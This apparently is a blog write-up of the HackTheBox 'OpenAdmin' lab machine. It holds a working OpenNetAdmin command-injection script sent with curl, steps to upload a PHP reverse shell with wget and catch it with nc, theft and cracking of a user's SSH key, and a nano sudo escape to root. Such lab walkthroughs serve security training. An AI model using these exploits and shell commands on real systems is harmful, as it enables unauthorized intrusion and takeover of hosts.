@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>
+        Hackthebox - OpenAdmin Writeup - A personal cybersecurity blog
+      </title>
+        <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    
+    <meta name="theme-color" content="#000000" />
+    <meta http-equiv="window-target" content="_top" />
+    
+    
+    <meta name="description" content="Difficulty : easy, topics: php, gtfobins, opennetadmin" />
+    <meta name="generator" content="Hugo 0.71.0 with theme pure" />
+    <title>Hackthebox - OpenAdmin Writeup - A personal cybersecurity blog</title>
+    
+    
+    <link rel="stylesheet" href="/css/style.min.9167e464480f2f7ea5d94b21496c23d7754ad83cf80376bd5fcb8f7988c7a508.css">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
+    <meta property="og:title" content="Hackthebox - OpenAdmin Writeup" />
+<meta property="og:description" content="Difficulty : easy, topics: php, gtfobins, opennetadmin" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/writeups/hackthebox-writeups/hackthebox-openadmin-writeup/" />
+<meta property="og:image" content="/shortcode" />
+<meta property="og:image" content="/" />
+<meta property="article:published_time" content="2020-05-02T08:24:19+06:00" />
+<meta property="article:modified_time" content="2020-05-02T08:24:19+06:00" />
+
+<meta itemprop="name" content="Hackthebox - OpenAdmin Writeup">
+<meta itemprop="description" content="Difficulty : easy, topics: php, gtfobins, opennetadmin">
+<meta itemprop="datePublished" content="2020-05-02T08:24:19&#43;06:00" />
+<meta itemprop="dateModified" content="2020-05-02T08:24:19&#43;06:00" />
+<meta itemprop="wordCount" content="518">
+<meta itemprop="image" content="/shortcode">
+<meta itemprop="image" content="/">
+
+
+
+<meta itemprop="keywords" content="php,gtfobins," /><meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/shortcode"/>
+
+<meta name="twitter:title" content="Hackthebox - OpenAdmin Writeup"/>
+<meta name="twitter:description" content="Difficulty : easy, topics: php, gtfobins, opennetadmin"/>
+
+    <!--[if lte IE 9]>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+      <![endif]-->
+
+    <!--[if lt IE 9]>
+        <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+      <![endif]-->
+
+  </head>
+
+  
+  
+
+  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="slimContent">
+      <div class="navbar-header">
+        <div class="profile-block text-center">
+          <a id="avatar" href="/">
+            <img class="img-circle img-rotate" src="/avatar.png" width="200" height="200">
+          </a>
+          <h2 id="name" class="hidden-xs hidden-sm">fmash16</h2>
+          <h3 id="title" class="hidden-xs hidden-sm hidden-md">Student</h3>
+          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Dhaka, Bangladesh</small>
+        </div><div class="search" id="search-form-wrap">
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
+                        class="icon icon-search"></i></button>
+            </span>
+        </div>
+        <div class="ins-search">
+            <div class="ins-search-mask"></div>
+            <div class="ins-search-container">
+                <div class="ins-input-wrapper">
+                    <input type="text" class="ins-search-input" placeholder="Type something..."
+                        x-webkit-speech />
+                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
+                        aria-label="Close"><span aria-hidden="true">×</span></button>
+                </div>
+                <div class="ins-section-wrapper">
+                    <div class="ins-section-container"></div>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+
+        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+        <ul class="nav navbar-nav main-nav">
+            <li class="menu-item menu-item-home">
+                <a href="/">
+                    <i class="icon icon-home-fill"></i>
+                  <span class="menu-title">Home</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-archives">
+                <a href="/posts/">
+                    <i class="icon icon-archives-fill"></i>
+                  <span class="menu-title">Posts</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-books">
+                <a href="/categories/">
+                    <i class="icon icon-book-fill"></i>
+                  <span class="menu-title">Writeups</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-tags">
+                <a href="/tags/">
+                    <i class="icon icon-tags"></i>
+                  <span class="menu-title">Tags</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-about">
+                <a href="/about/">
+                    <i class="icon icon-cup-fill"></i>
+                  <span class="menu-title">About</span>
+                </a>
+            </li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <div class="widget">
+  <h3 class="widget-title"><u> Categories</u></h3>
+    <div class="widget-body">
+        <ul class="category-list">
+            <li class="category-list-item"><a href="/categories/hackthebox-writeups/" class="category-list-link">hackthebox-writeups</a><span class="category-list-count">5</span></li>
+            <li class="category-list-item"><a href="/categories/tryhackme-writeups/" class="category-list-link">tryhackme-writeups</a><span class="category-list-count">3</span></li>
+        </ul>
+    </div>
+</div>
+<div class="widget">
+  <h3 class="widget-title"><u> Tags </u></h3>
+    <div class="widget-body">
+        <ul class="tag-list">
+            
+            
+            <a href="/tags/ad/" class="tag-list-link">ad</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/adminer/" class="tag-list-link">adminer</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/azure/" class="tag-list-link">azure</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/azure-ad-connect/" class="tag-list-link">azure-ad-connect</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/brainfuck/" class="tag-list-link">brainfuck</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/command-injection/" class="tag-list-link">command-injection</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/crackmapexec/" class="tag-list-link">crackmapexec</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/cron/" class="tag-list-link">cron</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/cve-2019-14287/" class="tag-list-link">cve-2019-14287</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/dll-injection/" class="tag-list-link">dll-injection</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/dns/" class="tag-list-link">dns</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/dnsadmins/" class="tag-list-link">dnsadmins</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/docker/" class="tag-list-link">docker</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/easy/" class="tag-list-link">easy</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/evil-winrm/" class="tag-list-link">evil-winrm</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/file-descriptor/" class="tag-list-link">file-descriptor</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/ftp/" class="tag-list-link">ftp</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/fuzzing/" class="tag-list-link">fuzzing</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/gtfobins/" class="tag-list-link">gtfobins</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/hacking/" class="tag-list-link">hacking</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/hydra/" class="tag-list-link">hydra</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/john/" class="tag-list-link">john</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/kvm/" class="tag-list-link">kvm</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/ldap/" class="tag-list-link">ldap</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/ldapsearch/" class="tag-list-link">ldapsearch</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/lfi/" class="tag-list-link">lfi</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/linux/" class="tag-list-link">linux</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/mysql/" class="tag-list-link">mysql</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/passthrough/" class="tag-list-link">passthrough</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/php/" class="tag-list-link">php</a><span class="tag-list-count">3</span>
+            
+            
+            <a href="/tags/powershell/" class="tag-list-link">powershell</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/practice/" class="tag-list-link">practice</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/privesc/" class="tag-list-link">privesc</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/pt_chown/" class="tag-list-link">pt_chown</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/pwn/" class="tag-list-link">pwn</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/python/" class="tag-list-link">python</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/python-path-hijack/" class="tag-list-link">python-path-hijack</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/qemu/" class="tag-list-link">qemu</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/rce/" class="tag-list-link">rce</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/rpcclient/" class="tag-list-link">rpcclient</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/stego/" class="tag-list-link">stego</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/sudo/" class="tag-list-link">sudo</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/virtualization/" class="tag-list-link">virtualization</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/web/" class="tag-list-link">web</a><span class="tag-list-count">1</span>
+            
+        </ul>
+
+    </div>
+</div>
+
+<div class="widget">
+  <h3 class="widget-title"><u> Recent Posts </u></h3>
+    <div class="widget-body">
+        <ul class="recent-post-list list-unstyled no-thumbnail">
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="/writeups/hackthebox-writeups/hackthebox-montevarde-writeup/" class="title">Hackthebox - Montevarde Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-30 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-30</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="/writeups/hackthebox-writeups/hackthebox-resolute-writeup/" class="title">Hackthebox - Resolute Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-29 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-29</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="/writeups/tryhackme-writeups/tryhackme-year-of-the-rabbit-writeup/" class="title">TryHackMe - Year of the Rabbit - Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-21 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-21</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="/writeups/tryhackme-writeups/tryhackme-ultratech-writeup/" class="title">TryHackMe - UltraTech Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-16 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-16</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="/writeups/tryhackme-writeups/tryhackme-dogcat-writeup/" class="title">TryHackMe - DogCat Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-12 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-12</time>
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</div>
+
+  </div>
+</aside>
+
+    
+    
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <h4 class="toc-title">Table of Contents</h4>
+    <nav id="toc" class="js-toc toc">
+
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main"><div class="content">
+  <article id="-" class="article article-type-" itemscope
+    itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      <h3 itemprop="name">
+  <a
+    class="article-title"
+    href="/writeups/hackthebox-writeups/hackthebox-openadmin-writeup/"
+    >Hackthebox - OpenAdmin Writeup</a
+  >
+</h3>
+
+      <div class="article-meta">
+        
+<span class="article-date">
+  <i class="icon icon-calendar-check"></i>&nbsp;
+<a href="/writeups/hackthebox-writeups/hackthebox-openadmin-writeup/" class="article-date">
+  <time datetime="2020-05-02 08:24:19 &#43;0600 &#43;06" itemprop="datePublished">2020-05-02</time>
+</a>
+</span>
+<span class="article-category">
+  <i class="icon icon-folder"></i>&nbsp;
+  <a class="article-category-link" href="/categories/hackthebox-writeups/"> Hackthebox writeups </a>
+</span>  
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>&nbsp;
+    <a class="article-tag-link" href="/tags/php/"> php </a>
+    <a class="article-tag-link" href="/tags/gtfobins/"> gtfobins </a>
+  </span>
+<br>
+        
+        
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
+      <p><img src="/img/htb_openadmin/card.png" alt=""></p>
+<h1 id="initial-foothold---getting-www-data-shell-using-exploit">Initial Foothold - Getting www-data shell using exploit</h1>
+<hr>
+<h2 id="nmap-scan">Nmap scan</h2>
+<hr>
+<p>Interesting ports:</p>
+<ul>
+<li>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;
+protocol
+2.0)</li>
+<li>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works</li>
+</ul>
+<p>We have a look at the webpage and we find a default apache webpage.</p>
+<h2 id="directory-searching-with-gobuster">Directory searching with Gobuster:</h2>
+<hr>
+<p>We now search for any web directories using gobuster</p>
+<p><img src="/img/htb_openadmin/1.png" alt=""></p>
+<p>We find two folders:</p>
+<ul>
+<li>/music</li>
+<li>/artwork</li>
+</ul>
+<p>Going into the /music directory, we find a webpage with login option</p>
+<p><img src="/img/htb_openadmin/2.png" alt=""></p>
+<p> </p>
+<h2 id="foothold">Foothold</h2>
+<p>Going into the login, we get an OpenNetAdmin login page at the address
+http://10.10.10.171/ona/</p>
+<p><img src="/img/htb_openadmin/3.png" alt=""></p>
+<p> </p>
+<h2 id="exploit">Exploit</h2>
+<hr>
+<p>Searching for exploits for OpenNetAdmin, we find a remote code execution
+vulnerability on exploit-db. (<a href="https://www.exploit-db.com/exploits/47691">https://www.exploit-db.com/exploits/47691</a>)
+We download the exploit and change it according to our needs.</p>
+<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#776e71">#! /bin/bash
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#776e71"></span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#ef6155">URL</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#34;</span><span style="color:#f99b15">${</span><span style="color:#ef6155">1</span><span style="color:#f99b15">}</span><span style="color:#48b685">&#34;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span style="color:#815ba4">while</span> true;<span style="color:#815ba4">do</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span> echo -n <span style="color:#48b685">&#34;</span>$<span style="color:#48b685"> &#34;</span>; read cmd
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span> curl --silent -d
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span style="color:#48b685">&#34;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span style="color:#48b685">\&#34;BEGIN\&#34;;</span><span style="color:#f99b15">${</span><span style="color:#ef6155">cmd</span><span style="color:#f99b15">}</span><span style="color:#48b685">;echo \&#34;END\&#34;&amp;xajaxargs[]=ping&#34;</span> <span style="color:#48b685">&#34;</span><span style="color:#f99b15">${</span><span style="color:#ef6155">URL</span><span style="color:#f99b15">}</span><span style="color:#48b685">&#34;</span> | sed -n -e
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span style="color:#48b685">&#39;/BEGIN/,/END/ p&#39;</span> | tail -n +2 | head -n -1
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span style="color:#815ba4">done</span>
+</code></pre></div><p>We run the exploit to get a web shell</p>
+<p><img src="/img/htb_openadmin/5.png" alt=""></p>
+<p>We try getting a reverse shell to get a more interactive shell.</p>
+<p>We get the php reverse shell from pentest monkey and upload it to the box using
+wget using the remote command execution vulnerability</p>
+<p>On host:</p>
+<pre><code># wget
+https://github.com/pentestmonkey/php-reverse-shell/raw/master/php-reverse-shell.php
+# python3 -m http.server
+# nc -lnvp 1234
+</code></pre><p>On target:</p>
+<pre><code>$ wget http://10.10.15.175:8000/php-reverse-shell.php
+</code></pre><p>Then we get our reverse shell going to the url
+http:/10.10.10.171/ona/php-reverse-shell.php</p>
+<p>And we get our reverse shell</p>
+<p><img src="/img/htb_openadmin/6.png" alt=""></p>
+<p> </p>
+<h1 id="privilege-escalation---user">Privilege Escalation - User:</h1>
+<hr>
+<p>From the reverse shell, we see that the banner prints out some info about the
+machine.
+We find:</p>
+<ul>
+<li>Running Ubuntu</li>
+<li>Two users:
+<ol>
+<li>joanna</li>
+<li>jimmy</li>
+</ol>
+</li>
+</ul>
+<p> </p>
+<h2 id="enumeration">Enumeration</h2>
+<hr>
+<p>We look around the /opt/www/ona directory and find a database config file
+which gives us a password.</p>
+<p><img src="/img/htb_openadmin/7.png" alt=""></p>
+<p>We find the password <strong>n1nj4W4rri0R!</strong></p>
+<p>We try it with both the users and find that it is the password for jimmy. We
+use the creds to ssh into the box as jimmy.</p>
+<p><img src="/img/htb_openadmin/8.png" alt=""></p>
+<p>But it does not have the user.txt file. So this is not our required user.</p>
+<p> </p>
+<h2 id="escalation-to-user-joanna">Escalation to user joanna:</h2>
+<hr>
+<h3 id="enumeration-port-52846">Enumeration (port 52846)</h3>
+<hr>
+<p>We run linpeas.sh on the target and found 2 open ports</p>
+<ul>
+<li>52846</li>
+<li>3306</li>
+</ul>
+<p>connecting to the port 52846 using curl, we get an html response.
+Now, we look into the var/www directory and find the directory internal, that
+contains an intersting file main.php</p>
+<p> 
+<img src="/img/htb_openadmin/9.png" alt=""></p>
+<p>So we see that it prints out the id_rsa of the user joanna.</p>
+<p>We curl the url <code>127.0.0.1:52846/main.php</code> and get the id_rsa of the user
+joanna</p>
+<p><img src="/img/htb_openadmin/10.png" alt=""></p>
+<p>We copy the file to our local machine and crack it with john</p>
+<p> </p>
+<h3 id="id_rsa-crack-with-john">id_rsa crack with john</h3>
+<hr>
+<p>Trying to login with the private key, we find that it requires a passphrase</p>
+<p><img src="/img/htb_openadmin/11.png" alt=""></p>
+<p>So, we crack the pass phrase using john</p>
+<p><img src="/img/htb_openadmin/12.png" alt=""></p>
+<p>We use the cracked passphrase to ssh into user joanna and get the user.txt</p>
+<p><img src="/img/htb_openadmin/13.png" alt=""></p>
+<p> </p>
+<h1 id="privilege-escalation---root">Privilege Escalation - Root:</h1>
+<hr>
+<h2 id="enumeration-1">Enumeration</h2>
+<hr>
+<p>We find that our user joanna is allowed to run the following command as sudo</p>
+<p><img src="/img/htb_openadmin/14.png" alt=""></p>
+<p> </p>
+<h2 id="escalation">Escalation</h2>
+<hr>
+<p>We run the command and get a nano editor running as root. We can spawn a root
+shell from the nano, following the commands found in
+<a href="https://gtfobins.github.io/gtfobins/nano/#sudo">GTFObins</a></p>
+<p>Commnads:</p>
+<pre><code>nano
+^R^X
+reset; sh 1&gt;&amp;0 2&gt;&amp;0
+</code></pre><p><img src="/img/htb_openadmin/15.png" alt=""></p>
+
+    </div>
+    <div class="article-footer">
+<blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    <li class="post-copyright-link hidden-xs">
+      <strong>Permalink: </strong>
+      <a href="/writeups/hackthebox-writeups/hackthebox-openadmin-writeup/" title="Hackthebox - OpenAdmin Writeup" target="_blank" rel="external">/writeups/hackthebox-writeups/hackthebox-openadmin-writeup/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>License：</strong><a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
+    </li>
+  </ul>
+</blockquote>
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/fmash16" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/avatar.png" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/fmash16" target="_blank"><span class="text-dark">fmash16</span></a></h3>
+        <div>Hack the Planet</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+    </div>
+  </article>
+<section id="comments">
+</section>
+
+</div><nav class="bar bar-footer clearfix" data-stick-bottom>
+    <div class="bar-inner">
+        <ul class="pager pull-left">
+            <li class="prev">
+                <a href="/writeups/tryhackme-writeups/tryhackme-blue-writeup/" title="TryHackMe - Blue Writeup"><i
+                        class="icon icon-angle-left"
+                        aria-hidden="true"></i><span>&nbsp;&nbsp;Older</span></a>
+            </li>
+            <li class="next">
+                <a href="/writeups/hackthebox-writeups/hackthebox-obscurity-writeup/"
+                    title="Hackthebox - Obscurity Writeup"><span>Newer&nbsp;&nbsp;</span><i
+                        class="icon icon-angle-right" aria-hidden="true"></i></a>
+            </li>
+            
+            <li class="toggle-toc">
+                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
+                    title="Catalogue" role="button">
+                    <span>[&nbsp;</span><span>Index</span>
+                    <i class="text-collapsed icon icon-anchor"></i>
+                    <i class="text-in icon icon-close"></i>
+                    <span>]</span>
+                </a>
+            </li>
+        </ul>
+        <div class="bar-right">
+            <div class="share-component" data-sites="facebook,twitter"
+                data-mobile-sites="">Share on:</div>
+        </div>
+    </div>
+</nav>
+
+
+
+</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+<ul class="social-links">
+    <li><a href="https://github.com/fmash16" target="_blank" title="github" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-github"></i></a></li>
+    <li><a href="/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-rss"></i></a></li>
+    <li><a href="https://twitter.com/fmash16" target="_blank" title="twitter" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-twitter"></i></a></li>
+</ul>
+  <div class="copyright">
+    &copy;2020  -
+    2020
+    
+    
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+            showMathMenu: false, //disables context menu
+            tex2jax: {
+            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
+           }
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+<script>
+    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script><script>
+    hljs.configure({
+        tabReplace: '    ', 
+        classPrefix: ''     
+        
+    })
+    hljs.initHighlightingOnLoad();
+</script>
+<script src="/js/application.min.bdeb64b910570b6c41badc6a05b7afb0c8ad9efd8525de3c7257d59e786326a3.js"></script>
+<script src="/js/plugin.min.51ff8c7317566f82259170fa36e09c4493adc9b9378b427a01ad3f017ebac7dd.js"></script>
+
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            ROOT_URL: '\/',
+            CONTENT_URL: '\/\/searchindex.json ',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script type="text/javascript" src="/js/insight.min.7f3407251ef14950645ac695d0cf7cd29c5cabfb6916e63dcb54b83d8f1fc2126d10bd5446875e78d27a76ecd651a3532b49a7e4da02ee4de51660edba2d23f1.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        
+        tocSelector: '.js-toc',
+        
+        contentSelector: '.js-toc-content',
+        
+        headingSelector: 'h1, h2, h3',
+        
+        hasInnerContainers: true,
+    });
+</script>
+
+
+  </body>
+</html>
